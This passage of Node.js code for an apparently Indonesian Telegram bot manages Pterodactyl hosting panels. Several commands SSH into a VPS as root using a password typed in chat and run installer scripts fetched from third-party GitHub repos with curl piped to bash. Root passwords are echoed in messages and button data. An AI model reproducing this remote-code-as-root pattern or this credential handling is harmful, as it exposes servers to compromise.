  const command = `bash <(curl -s https://raw.githubusercontent.com/Kelaoffc/Ndyoffc/refs/heads/main/installndyoffc.sh)`;

  await bot.sendMessage(
    chatId,
    `🌀 *Install Wallpaper Dimulai*
📡 IP: \`${ipvps}:${port}\`
🖼️ Wallpaper: ${wallpaper}
⏳ Tunggu 1–10 menit...`,
    { parse_mode: "Markdown" }
  );

  ssh.on("ready", () => {
    ssh.exec(command, (err, stream) => {
      if (err) {
        ssh.end();
        return bot.sendMessage(chatId, "❌ Gagal menjalankan perintah SSH.");
      }

      stream.on("data", () => {
        stream.write("metrickpack2\n");
        stream.write("4\n");
        stream.write(`${wallpaper}\n`);
        stream.write("23\n");
      });

      stream.on("close", () => {
        bot.sendMessage(chatId, "✅ *Wallpaper berhasil diinstall!*", { parse_mode: "Markdown" });
        ssh.end();
      });
    });
  });

  ssh.on("error", () => bot.sendMessage(chatId, "❌ SSH gagal — cek IP atau Password!"));
  ssh.connect(conn);
});

bot.onText(/^\/installtema(?:\s+(.+))?$/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const text = match[1];
    const userId = msg.from.id.toString();

    if (!text) {
      return bot.sendMessage(
        chatId,
        `⚙️ *Format salah!*\nGunakan format:\n\`/installtema ipvps|passwordvps\`\n\nContoh:\n\`/installtema 123.45.67.89|root123\``,
        { parse_mode: "Markdown" }
      );
    }

    const t = text.split("|");
    if (t.length < 2) {
      return bot.sendMessage(
        chatId,
        `⚠️ Format tidak lengkap!\nGunakan format: \`/installtema ipvps|passwordvps\``,
        { parse_mode: "Markdown" }
      );
    }

    const ipvps = t[0].trim();
    const passwd = t[1].trim();

    const opts = {
      reply_markup: {
        inline_keyboard: [
        [{ text: "💰 INSTALL BILLING", callback_data: `install_billing|${ipvps}|${passwd}` },{ text: "📦 INSTALL NOOK", callback_data: `install_nook|${ipvps}|${passwd}` }],
      [{ text: "🖼️ INSTALL WALLPAPER", callback_data: `install_wallpaper|${ipvps}|${passwd}` },{ text: "🎶 INSTALL NIGHTCORE", callback_data: `install_nightcore|${ipvps}|${passwd}` }],
      [{ text: "🗑️ UNINSTALL TEMA", callback_data: `uninstall_tema|${ipvps}|${passwd}` }]
        ]
      }
    };

    await bot.sendMessage(
      chatId,
      `🎨 *Pilih Tema yang ingin diinstall:*\n\n📡 IP VPS: \`${ipvps}\`\n🔑 Password: \`${passwd}\``,
      { ...opts, parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error(err);
    bot.sendMessage(msg.chat.id, `❌ Terjadi error: ${err.message}`);
  }
});
// === HANDLE CALLBACK PILIHAN ===
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const [action, ipvps, passwd] = query.data.split("|");
    await bot.answerCallbackQuery(query.id);

    const temaMap = {
      install_nook: "/installnook",
      install_billing: "/installbilling",
      install_nightcore: "/installnightcore",
      install_wallpaper: "/installwallpaper",
      uninstall_tema: "/uninstalltema",
    };
    const command = temaMap[action];

    // Trigger command as if typed manually
    bot.processUpdate({
      update_id: Date.now(),
      message: {
        message_id: query.message.message_id + 1,
        from: query.from,
        chat: { id: chatId, type: "private" },
        text: `${command} ${ipvps}|${passwd}`,
        date: Math.floor(Date.now() / 1000),
      },
    });
  } catch (err) {
    console.error("Callback Error:", err);
    bot.sendMessage(query.message.chat.id, `❌ Gagal memproses tombol: ${err.message}`);
  }
});


bot.onText(/^\/installnightcore(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const senderId = msg.from.id;
  const input = (match[1] || "").trim();

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  if (!input || !input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installnightcore ip|password`",
      { parse_mode: "Markdown" }
    );
  }

  const [ip, pw] = input.split("|");
  ipvps = ip.trim();
  passwd = pw.trim();

  if (!ipvps || !passwd) {
    return bot.sendMessage(chatId, "⚠️ IP atau Password tidak boleh kosong!", {
      parse_mode: "Markdown",
    });
  }

  global.installtema = { vps: ipvps, pwvps: passwd };

  let port = 22;
  if (ipvps.includes(":")) {
    const [host, portNum] = ipvps.split(":");
    ipvps = host;
    port = parseInt(portNum, 10) || 22;
  }

  const connSettings = {
    host: ipvps,
    port,
    username: "root",
    password: passwd,
    readyTimeout: 20000,
  };

  const command = "bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)";
  const ress = new Client();

  await bot.sendMessage(
    chatId,
    `🌀 *Proses Install Tema Nightcore*
📡 IP: \`${ipvps}:${port}\`
⏳ Tunggu 1–10 menit...`,
    { parse_mode: "Markdown" }
  );

  ress.on("ready", () => {
    ress.exec(command, (err, stream) => {
      if (err) {
        console.error("SSH exec error:", err);
        try { ress.end(); } catch {}
        return bot.sendMessage(chatId, "❌ Gagal menjalankan perintah di server.");
      }

      stream
        .on("data", (data) => {
          console.log(`[${ipvps}] ${data.toString()}`);
          try {
            // Urutan input otomatis sesuai script Nightcore
            stream.write("1C\n");
            stream.write("y\n");
            stream.write("yes\n");
            stream.write("y\n");
            stream.write("\n");
          } catch (e) {
            console.log("Write error:", e);
          }
        })
        .on("close", async () => {
          await bot.sendMessage(chatId, "✅ *Berhasil install tema Nightcore Pterodactyl!*", {
            parse_mode: "Markdown",
          });
          ress.end();
        })
        .stderr.on("data", (data) => console.log(`[STDERR ${ipvps}] ${data.toString()}`));
    });
  });

  ress.on("error", (err) => {
    console.error("Connection Error:", err);
    try { ress.end(); } catch {}
    bot.sendMessage(chatId, "❌ Koneksi SSH gagal — periksa IP, port, atau password!");
  });

  try {
    ress.connect(connSettings);
  } catch (e) {
    console.error("SSH connect error:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencoba koneksi ke VPS!");
  }
});

bot.onText(/^\/installbilling(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const input = (match[1] || "").trim();
  const senderId = msg.from.id;

  // 🔐 OWNER ONLY
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  // ❌ TANPA INPUT → TUTORIAL
  if (!input) {
    return bot.sendMessage(
      chatId,
      `⚠️ Format salah!\nGunakan:\n/installbilling ip|password\nContoh:\n/installbilling 1.2.3.4|root123`,
      { parse_mode: "Markdown" }
    );
  }

  // ❌ FORMAT SALAH
  if (!input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installbilling ip|password`\nContoh:\n`/installbilling 1.2.3.4|root123`",
      { parse_mode: "Markdown" }
    );
  }

  const [ip, pw] = input.split("|");
  ipvps = ip.trim();
  passwd = pw.trim();

  if (!ipvps || !passwd) {
    return bot.sendMessage(chatId, "⚠️ IP atau Password tidak boleh kosong!\nGunakan format: `/installbilling ip|password`", {
      parse_mode: "Markdown",
    });
  }

  global.installtema = { vps: ipvps, pwvps: passwd };

  let port = 22;
  if (ipvps.includes(":")) {
    const [host, portNum] = ipvps.split(":");
    ipvps = host;
    port = parseInt(portNum, 10) || 22;
  }

  const connSettings = {
    host: ipvps,
    port: port,
    username: "root",
    password: passwd,
  };

  const command = `bash <(curl -s https://raw.githubusercontent.com/Zero-Hiroo/Autoinstall-/refs/heads/main/bangkai.sh)`;
  const ress = new Client();

  await bot.sendMessage(
    chatId,
    `🌀 *Memproses install tema Billing (Zero-Hiroo) Pterodactyl...*\n📡 IP: \`${ipvps}:${port}\`\n⏳ Tunggu 1–10 menit hingga proses selesai...`,
    { parse_mode: "Markdown" }
  );

  ress.on("ready", () => {
    ress.exec(command, (err, stream) => {
      if (err) {
        console.error("SSH exec error:", err);
        try { ress.end(); } catch (e) {}
        return bot.sendMessage(chatId, "❌ Gagal menjalankan perintah di server.");
      }

      stream
        .on("data", (data) => {
          console.log(`[${ipvps}] ${data.toString()}`);
          try {
            
            stream.write("1\n");
            stream.write("2\n");   
            stream.write("yes\n"); 
            stream.write("x\n");
          } catch (e) {
            console.log("Write error:", e);
          }
        })
        .on("close", async () => {
          await bot.sendMessage(chatId, "✅ *Berhasil install tema Billing (Zero-Hiroo) Pterodactyl!*", { parse_mode: "Markdown" });
          ress.end();
        })
        .stderr.on("data", (data) => console.log(`[STDERR ${ipvps}] ${data.toString()}`));
    });
  });

  ress.on("error", (err) => {
    console.error("Connection Error:", err);
    try { ress.end(); } catch (e) {}
    bot.sendMessage(chatId, "❌ Koneksi SSH gagal — periksa IP, port, atau password!");
  });

  try {
    ress.connect(connSettings);
  } catch (e) {
    console.error("SSH connect error:", e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencoba koneksi ke VPS!");
  }
});
//=======plugins=======//
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); 
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    
  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

bot.onText(/\/listadmin/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  if (!adminUsers || !adminUsers.length) {
    return bot.sendMessage(chatId, "📛 Belum ada admin yang terdaftar.");
  }

  const list = adminUsers.map((id, i) => `${i + 1}. \`${id}\``).join("\n");
  bot.sendMessage(chatId, `👑 *Daftar Admin Bot:*\n\n${list}`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/^\/restart$/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!OWNER_ID.includes(String(senderId))) {
    return bot.sendMessage(chatId, "❌ Lu bukan owner.");
  }

  await bot.sendMessage(chatId, "♻️ Restarting bot...");

  setTimeout(() => {
    const args = [...process.argv.slice(1), "--restarted-from", String(chatId)];
    const child = spawn(process.argv[0], args, {
      detached: true,
      stdio: "inherit",
    });
    child.unref();
    process.exit(0);
  }, 1000);
});

// MD MENU \\
bot.onText(/^\/iqc(?:\s+(.*))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "⏳ Tunggu sebentar...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Nih Kece ga`,
      parse_mode: "Markdown",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

//▰▰▰▰▰▰▰▰▰▰
// listsrv
bot.onText(/^\/listsrv$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  try {
    const f = await fetch(`${domain}/api/application/servers?page=1`, {
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    const res = await f.json();
    const servers = res.data || [];
    let text = "📋 DAFTAR SERVER (V1)\n\n";

    for (const server of servers) {
      const s = server.attributes;

      const st = await fetch(
        `${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`,
        {
          headers: {
            Accept: "application/json",
            Authorization: `Bearer ${pltc}`,
          },
        }
      );

      const sd = await st.json();
      const status = sd.attributes?.current_state || s.status;

      text += `🆔 ID: ${s.id}\n`;
      text += `📦 Nama: ${s.name}\n`;
      text += `⚡ Status: ${status}\n\n`;
    }

    bot.sendMessage(chatId, text);
  } catch (e) {
    bot.sendMessage(chatId, "❌ Gagal mengambil daftar server.");
  }
});
bot.onText(/^\/listsrv2$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  try {
    const f = await fetch(`${domainv2}/api/application/servers?page=1`, {
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
    });

    const res = await f.json();
    const servers = res.data || [];
    let text = "📋 DAFTAR SERVER (V2)\n\n";

    for (const server of servers) {
      const s = server.attributes;

      const st = await fetch(
        `${domainv2}/api/client/servers/${s.uuid.split("-")[0]}/resources`,
        {
          headers: {
            Accept: "application/json",
            Authorization: `Bearer ${pltcv2}`,
          },
        }
      );

      const sd = await st.json();
      const status = sd.attributes?.current_state || s.status;

      text += `🆔 ID: ${s.id}\n`;
      text += `📦 Nama: ${s.name}\n`;
      text += `⚡ Status: ${status}\n\n`;
    }

    bot.sendMessage(chatId, text);
  } catch (e) {
    bot.sendMessage(chatId, "❌ Gagal mengambil daftar server.");
  }
});
bot.onText(/^\/delsrv\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const srvId = match[1];

  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  try {
    const del = await fetch(`${domain}/api/application/servers/${srvId}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });

    if (!del.ok) {
      return bot.sendMessage(chatId, "❌ SERVER TIDAK DITEMUKAN.");
    }

    bot.sendMessage(chatId, "✅ SERVER BERHASIL DIHAPUS.");
  } catch (e) {
    bot.sendMessage(chatId, "❌ Gagal menghapus server.");
  }
});
bot.onText(/^\/delsrv2\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const srvId = match[1];

  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }

  try {
    const del = await fetch(`${domainv2}/api/application/servers/${srvId}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        Authorization: `Bearer ${pltav2}`,
      },
    });

    if (!del.ok) {
      return bot.sendMessage(chatId, "❌ SERVER TIDAK DITEMUKAN.");
    }

    bot.sendMessage(chatId, "✅ SERVER BERHASIL DIHAPUS.");
  } catch (e) {
    bot.sendMessage(chatId, "❌ Gagal menghapus server.");
  }
}); 


bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /1gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "1gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "1024";
  const cpu = "30";
  const disk = "1024";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.pirzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
// 2gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
    if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /2gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "2gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "2048";
  const cpu = "60";
  const disk = "2048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@buyer.pirzyzy`;
  const akunlo = randomImage;
  const password = `${username}${Math.floor(1000 + Math.random() * 9000)}`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
  const panelData = readPanelData();
  panelData[username] = {
    username: username,
    password: password,
    email: email,
    userId: user.id,
    memory: server.limits.memory,
    disk: server.limits.disk,
    cpu: server.limits.cpu,
    domain: domain,
  };
  savePanelData(panelData);
    bot.sendMessage(
      chatId,
`
┏━⬣✧「 SPESIFIKASI PANEL 」✧
┃ ✧ NAMA: ${username}
┃ ✧ EMAIL: ${email}
┃ ✧ ID: ${user.id}
┃ ✧ MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
┃ ✧ DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
┃ ✧ CPU: ${server.limits.cpu}%
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
    try {
      if (akunlo) {
       await await bot.sendPhoto(u, akunlo, {
  caption: `Hai @${u}
┏━⬣ ✧「 DATA PANEL ANDA 」✧
┃ 好 Username : <code>${user.username}</code>
┃ 好 Password : <code>${password}</code>
┃ 好 Login : ${domain}
┣━━━━━━━⬣
┃ ✧ Jangan Ddos Server
┃ ✧ Wajib tutup domain saat screenshot
┃ ✧ Jangan Sebar / G.a Panel
┃ ✧ Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣`,
      parse_mode: "HTML",
      disable_web_page_preview: true
        });
       await bot.sendMessage(
          chatId,
          "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
        );
      }
    } catch (err) {
      notifyFailedSend(bot, chatId, username, u);
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = getRandomImage();
    
  if (!canCreatePanel(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan user Premium.");
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /3gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
